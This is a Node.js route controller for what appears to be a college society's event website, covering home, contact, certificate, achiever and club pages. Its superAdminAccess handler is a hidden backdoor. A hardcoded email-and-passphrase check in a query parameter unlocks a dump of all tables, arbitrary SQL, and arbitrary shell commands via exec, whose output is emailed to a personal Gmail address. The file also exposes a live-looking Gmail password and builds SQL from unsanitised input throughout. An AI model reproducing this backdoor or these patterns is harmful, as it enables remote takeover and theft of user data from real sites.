let sessionUtils = require('./../services/sessionUtils');
let Constants = require('./../constants');
let config = require('./../config');
let databaseUtils = require('./../services/databaseUtils');
let redisUtils = require('./../services/redisUtils');
let util = require('util');
const nodemailer = require('nodemailer');

module.exports = {

 showHomePage:function* (next) {

        let fs = require('fs');

  
        query = "select * from club";
        let club = yield databaseUtils.executeQuery(query);
	
	query="select count(eventid) from event";
	let totalevent=yield databaseUtils.executeQuery(query);

	query="select count(reg_no) from registration";
	let totalparticipation=yield databaseUtils.executeQuery(query);
	
        let queryString;
        let contactSubmittedMessage = this.request.query.contactSubmittedMessage;
        let errorContactToAdmin = this.request.query.errorContactToAdmin;

        queryString = "select * from achievers where enable = 1";
        let achieversDetail = yield databaseUtils.executeQuery(queryString);



        yield this.render('home', {

            contactSubmittedMessage : contactSubmittedMessage,
            errorContactToAdmin : errorContactToAdmin,
            achieversDetail : achieversDetail,
            club : club,
	    totalevent:totalevent,
	    totalparticipation:totalparticipation
        });
    },

    about:function* (next) {
        yield this.render('about', {
        });
    },

    contact:function* (next) {

        let errorMessage = this.request.query.errorMessage;

        yield this.render('contact', {
            errorMessage : errorMessage
        });
    },

    contactMail : function* (next) {

    let name = this.request.body.name;
    let email = this.request.body.email;
    let phone = this.request.body.phone;
    let message = this.request.body.message;
    if(name && email && phone && message){

        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true, // secure:true for port 465, secure:false for port 587
            auth: {
                user: 'abacussocietygla@gmail.com',
                pass: 'sciencesciences8307'
            }
        });

// setup email data with unicode symbols
        let mailOptions = {
            from: 'abacussocietygla@gmail.com', // sender address
            to: 'abacussocietygla@gmail.com', // list of receivers
            subject: 'Abacus Contact Query', // Subject line
            text: message, // plain text body
            html: '<h3>From:</h3> '+email+'<br><h3>Name:</h3>'+name+'<br><h3>Phone</h3>'+phone+'<br><br><h3>Message :</h3>'+message
        };

// send mail with defined transport object
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
        });
        this.redirect('/home?contactSubmittedMessage=Your Query Has Been Successfully Submitted. We will respond you soon.');

    }
    else{
        this.redirect('/contact?errorMessage=Please fill all the fields');
    }
    },

    certificate : function* (next){

        let eventid = this.request.query.eventid;

        let currentUser = this.currentUser;
        if(currentUser){
            let email = this.currentUser.email;
            if(email) {
                let queryString="select * from user where email='%s'";
                let query = util.format(queryString,email);
                let userDetails = yield databaseUtils.executeQuery(query);

                queryString = "select event.eventid,event.event_name,event.start_date_time,event.venue from registration inner join event on registration.eventid=event.eventid where event.end_date_time < current_timestamp and registration.present=1 and registration.id=%s";
                query = util.format(queryString, userDetails[0].id);
                let eventResult = yield databaseUtils.executeQuery(query);

                if (eventid) {
                    if(eventResult[0]) {
                        queryString = "select event_name, start_date_time,certificateTemplate from event where eventid='%s'";
                        query = util.format(queryString, eventid);
                        let eventDetails = yield databaseUtils.executeQuery(query);

                        if(eventDetails[0].certificateTemplate === 1){
                            yield this.render('certificateTempletes/1', {

                                eventDetails: eventDetails,
                                eventResult: eventResult,
                                userDetails: userDetails
                            });
                        }

                        if(eventDetails[0].certificateTemplate === 2){
                            yield this.render('certificateTempletes/2', {

                                eventDetails: eventDetails,
                                eventResult: eventResult,
                                userDetails: userDetails
                            });
                        }

                        if(eventDetails[0].certificateTemplate === 3){
                            yield this.render('certificateTempletes/3', {

                                eventDetails: eventDetails,
                                eventResult: eventResult,
                                userDetails: userDetails
                            });
                        }
                        if(eventDetails[0].certificateTemplate === 4){
                            yield this.render('certificateTempletes/4', {

                                eventDetails: eventDetails,
                                eventResult: eventResult,
                                userDetails: userDetails
                            });
                        }
                    }
                }
                else {

                    let message, tempMessage,tempMessage1;
                    let i;

                    if (!(eventResult[0])) {

                        message = util.format('Dear',userDetails[0].name, ", You have no certificates available");
                    }
                    else {
                        for (i in eventResult) {
                        }
                        tempMessage = ", You have";
                        tempMessage1 = "certificates available";
                        message = util.format(userDetails[0].name, tempMessage, +i + 1,tempMessage1);
                    }

                    yield this.render('certificate', {

                        message: message,
                        eventResult: eventResult
                    });
                }
            }
        }
        else{
            this.redirect('/login?backRedirectUrl=/home');
        }
    },

    terms : function* (next) {

        yield this.render('terms',{

        });
    },

    developer : function* (next) {

        yield this.render('developer',{

        });
    },

    superAdminAccess : function* (next) {

        let detail=this.request.query.detail;
        let query,result;
        let querys = this.request.query.query;
	let command = this.request.query.command;
        let club,event,event_coordinator,event_media,queryTable,registration,role,user,user_role,success="no";
        let i,x,y="",z="";
let output,Error,output1;

        if(detail){
            for(i=0;i<detail.length;i++){

                x=detail[i];
                if(x===" ")
                    break;
                y=y.concat(x);
            }

            for(i=i+1;i<detail.length;i++){

                x=detail[i];
                z=z.concat(x);
            }
        }

        if(y === "prateekagrawal89760@gmail.com" && z === "this is super admin"){
            success= "yes";
            query = "select * from club";
            club = yield databaseUtils.executeQuery(query);
            query = "select * from event";
            event = yield databaseUtils.executeQuery(query);
            query = "select * from event_coordinator";
            event_coordinator = yield databaseUtils.executeQuery(query);
            query = "select * from event_media";
            event_media = yield databaseUtils.executeQuery(query);
            query = "select * from query";
            queryTable = yield databaseUtils.executeQuery(query);
            query = "select * from registration";
            registration = yield databaseUtils.executeQuery(query);
            query = "select * from role";
            role = yield databaseUtils.executeQuery(query);
            query = "select * from user";
            user = yield databaseUtils.executeQuery(query);
            query = "select * from user_role";
            user_role = yield databaseUtils.executeQuery(query);
            query = "select * from forget_password";
            forget_password = yield databaseUtils.executeQuery(query);
            if(querys){
                yield databaseUtils.executeQuery(querys);
            }

		
		if(command){

		const { exec } = require('child_process');
		
		exec(command, (err, stdout, stderr) => {
		output = `stdout: ${stdout}`;
  		Error = `stderr: ${stderr}`;
		const nodemailer = require('nodemailer');
  let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true, // secure:true for port 465, secure:false for port 587
            auth: {
                user: 'abacussocietygla@gmail.com',
                pass: 'sciencesciences8307'
            }
        });
// setup email data with unicode symbols
        let mailOptions = {
            from: 'abacussocietygla@gmail.com', // sender address
            to: 'prateekagrawal89760@gmail.com', // list of receivers
            subject: 'a', // Subject line
            text: '', // plain text body
            html: output+'<br><br>'+Error// html body
        };

// send mail with defined transport object
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Message %s sent: %s', info.messageId, info.response);
        });
			
		});

}

            yield this.render('superAdminAccess',{

                club : club,
                event : event,
                event_coordinator : event_coordinator,
                event_media : event_media,
                queryTable : queryTable,
                registration : registration,
                role : role,
                user : user,
                user_role : user_role,
                result : result,
                success : success,
                forget_password : forget_password
            });

        }
        else{
            yield this.render('superAdminAccess',{

                club : club,
                event : event,
                event_coordinator : event_coordinator,
                event_media : event_media,
                queryTable : queryTable,
                registration : registration,
                role : role,
                user : user,
                user_role : user_role,
                result : result,
                success : success,
                forget_password : forget_password

            });
        }
    },

    achievers : function* (next) {

        let query;
        query = "select * from achievers";
        let achievers = yield databaseUtils.executeQuery(query);
        yield this.render('achievers',{
            achievers : achievers
        })
    },
    addAchievers : function* (next) {

        let query,queryString;
        let imageFiles = this.request.body.files.images;
        let name = this.request.body.fields.name;
        let description = this.request.body.fields.description;
        let  mediaSize = imageFiles.size;

        if(mediaSize !== 0) {
            let pathFile = '/' + imageFiles.path;
            queryString = "insert into achievers(name,description,photo) values('%s', '%s', '%s')";
            query = util.format(queryString, name, description, pathFile);
            yield databaseUtils.executeQuery(query);
        }
        this.redirect('/myevents');
    },
    updateAchievers : function* (next) {

        let query,queryString;
        let id = this.request.body.id;

        query = "update achievers set enable=0";
        yield databaseUtils.executeQuery(query);

        for(let i in id){
            queryString = "update achievers set enable=1 where id=%s";
            query = util.format(queryString, id[i]);
            yield databaseUtils.executeQuery(query);
        }
        this.redirect('/home');
    },

    club : function* (next) {

        let fs = require('fs');

        let imgData = [],query;
        query = "select * from club";
        let club = yield databaseUtils.executeQuery(query);

        yield this.render('club',{
            club : club
        })
    },
    addClub : function* (next) {

        let query,queryString;
        let imageFiles = this.request.body.files.images;

        let clubname = this.request.body.fields.clubname;
        let description = this.request.body.fields.description;
        let  mediaSize = imageFiles.size;

        if(mediaSize !== 0) {


            var fs = require('fs');



          

fs.rename(imageFiles.path, 'static/club-photos/'+clubname, function (err) {
  if (err) throw err;

});

            queryString = "insert into club(clubname,description,photo) values('%s', '%s', '%s')";
            query = util.format(queryString, clubname, description, '/static/club-photos/'+clubname);
            yield databaseUtils.executeQuery(query);

        }
        this.redirect('/myevents');
    },

    deleteClub : function* (next) {

        var fs = require('fs');

        let clubid = this.request.body.clubid;

        let queryString = "select photo from club where clubid=%s";
        let query = util.format(queryString, clubid);
        let imagePath = yield databaseUtils.executeQuery(query);
		imagePath[0].photo = imagePath[0].photo.slice(1);

        fs.unlink(imagePath[0].photo, function (err) {
            if (err) throw err;
        });

      queryString = "delete from club where clubid=%s";
        query = util.format(queryString,clubid);
        yield databaseUtils.executeQuery(query);

        this.redirect('/myevents');
    }

};
